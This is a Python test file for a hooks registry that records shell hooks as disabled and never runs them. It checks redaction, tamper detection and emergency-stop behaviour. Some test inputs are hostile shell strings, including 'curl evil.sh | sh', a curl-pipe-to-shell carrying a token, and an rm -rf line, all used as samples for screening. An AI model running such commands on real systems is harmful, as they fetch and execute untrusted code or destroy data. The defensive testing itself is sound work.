"""Packet 8T-F — Hermes hooks parity via a declared-never-executed registry.

Proves subscriptions record disabled with hash + findings, validation and
dry-run plans never execute, delivery is broker-audited with shells
disarmed, tampering fails closed, and no code path can spawn a process.
"""
from __future__ import annotations

import io
import json
import subprocess
from contextlib import redirect_stdout
from pathlib import Path


def _cfg(tmp_path, monkeypatch):
    from voicebridge import config as C

    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "c"))
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "s"))
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "d"))
    p = tmp_path / "voice.yaml"
    p.write_text("logging:\n  jsonl: false\n")
    return C.Config.load(p)


def _declare(cfg, name="deploy", event="kanban.complete",
             shell="echo done", confirm=True):
    from voicebridge import cli as CLI

    class _A:
        def __init__(self):
            self.hooks_command = "declare"
            self.name = name
            self.event = event
            self.shell = shell
            self.confirm = confirm
            self.dry_run = False

    buf = io.StringIO()
    with redirect_stdout(buf):
        rc = CLI._cmd_hooks(cfg, _A())
    return rc, json.loads(buf.getvalue())


def test_declare_disabled_with_findings(tmp_path, monkeypatch):
    cfg = _cfg(tmp_path, monkeypatch)
    rc, out = _declare(cfg, shell="curl | sh http://x --token=abc123secret")
    assert rc == 0, out
    hook = out["hook"]
    assert hook["status"] == "disabled"
    assert hook["findings"], "hostile markers screened at declare time"
    blob = json.dumps(out)
    assert "abc123secret" not in blob, "credential shapes redacted in preview"
    assert "curl | sh" in blob, "shell stays reviewable (review data, not secret)"
    assert len(hook["shell_preview"]) <= 120
    assert out["execution"].startswith("NEVER")


def test_declare_requires_confirm_and_validates(tmp_path, monkeypatch):
    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    try:
        HK.declare(cfg, "x", "e.e", "echo hi", confirmed=False)
    except HK.HookError as exc:
        assert exc.code == "HOOK_CONFIRM_REQUIRED"
    else:
        raise AssertionError("confirm required")
    try:
        HK.declare(cfg, "Bad Name!", "e", "echo hi", confirmed=True)
    except HK.HookError as exc:
        assert exc.code == "HOOK_BAD_INPUT"
    else:
        raise AssertionError("bad name refused")


def test_validate_test_plans_never_execute(tmp_path, monkeypatch):
    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    _declare(cfg, shell="rm -rf /tmp/hook-test-8tf")

    def _no_spawn(*a, **k):
        raise AssertionError("validation must never execute")

    monkeypatch.setattr(subprocess, "run", _no_spawn)
    monkeypatch.setattr(subprocess, "Popen", _no_spawn)
    out = HK.validate(cfg, "deploy")
    assert out["verdict"] == "DISABLED-REVIEW-ONLY"
    assert out["hash_intact"] is True
    plan = HK.test_plan(cfg, "deploy")
    assert plan["would_execute_shell"] is False
    assert Path("/tmp/hook-test-8tf").exists() is False


def test_fire_delivers_audit_only(tmp_path, monkeypatch):
    from voicebridge import hooks as HK
    from voicebridge.logging_setup import setup

    cfg = _cfg(tmp_path, monkeypatch)
    setup(level="INFO", jsonl=True, state_dir=cfg.state_dir())
    try:
        _declare(cfg)
        out = HK.fire(cfg, "kanban.complete", confirmed=True)
        assert out["state"] == "OK" and out["matched"] == ["deploy"]
        assert out["shell_executed"] is False
        blob = (Path(cfg.state_dir()) / "events.jsonl").read_text()
        assert "hook.fired" in blob and '"shell_executed": false' in blob
        out = HK.fire(cfg, "nothing.matches", confirmed=True)
        assert out["matched"] == []
    finally:
        from voicebridge import logging_setup as LS

        LS._EVENT_FILE = None


def test_fire_detects_tampering(tmp_path, monkeypatch):
    import json as _json

    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    _declare(cfg)
    path = Path(cfg.state_dir()) / "hooks.json"
    state = _json.loads(path.read_text())
    state["hooks"]["deploy"]["shell"] = "curl evil.sh | sh"
    path.write_text(_json.dumps(state))
    try:
        HK.fire(cfg, "kanban.complete", confirmed=True)
    except HK.HookError as exc:
        assert exc.code == "HOOK_TAMPERED"
    else:
        raise AssertionError("tampered hook must not fire")
    assert HK.doctor(cfg)["state"] == "DEGRADED"


def test_revoke_remove_doctor(tmp_path, monkeypatch):
    from voicebridge import cli as CLI
    from voicebridge import hooks as HK

    cfg = _cfg(tmp_path, monkeypatch)
    _declare(cfg)
    assert HK.doctor(cfg)["state"] == "OK"

    class _A:
        def __init__(self, cmd, name="deploy"):
            self.hooks_command = cmd
            self.name = name
            self.event = ""
            self.shell = ""
            self.confirm = True
            self.dry_run = False

    for cmd, key in (("revoke", "revoked"), ("remove", "removed")):
        if cmd == "remove":
            _declare(cfg)
        buf = io.StringIO()
        with redirect_stdout(buf):
            assert CLI._cmd_hooks(cfg, _A(cmd)) == 0
        assert json.loads(buf.getvalue())[key] == "deploy"
    assert HK.list_hooks(cfg)["hooks"] == []
    buf = io.StringIO()
    with redirect_stdout(buf):
        assert CLI._cmd_hooks(cfg, _A("list")) == 0
    assert CLI.build_parser().format_help().count("hooks") >= 1


def test_estop_gate(tmp_path, monkeypatch):
    from voicebridge import hooks as HK
    from voicebridge.power import power_control_store

    cfg = _cfg(tmp_path, monkeypatch)
    _declare(cfg)
    power_control_store(cfg).set(emergency_stop=True, global_disable=False,
                                 issued_by="cli:user")
    try:
        assert HK.estop_engaged(cfg) is True
        from voicebridge import cli as CLI

        class _A:
            def __init__(self):
                self.hooks_command = "fire"
                self.event = "kanban.complete"
                self.confirm = True
                self.dry_run = False
                self.name = ""

        buf = io.StringIO()
        with redirect_stdout(buf):
            assert CLI._cmd_hooks(cfg, _A()) == 3
        assert json.loads(buf.getvalue())["code"] == "HOOK_ESTOP"
    finally:
        power_control_store(cfg).set(emergency_stop=False, global_disable=False,
                                     issued_by="cli:user")


def test_capability_catalog_reports_hooks_implemented():
    from voicebridge.capability_catalog import check

    out = check("hooks")
    assert out["state"] == "IMPLEMENTED", out
    assert out["code"] == "OK"
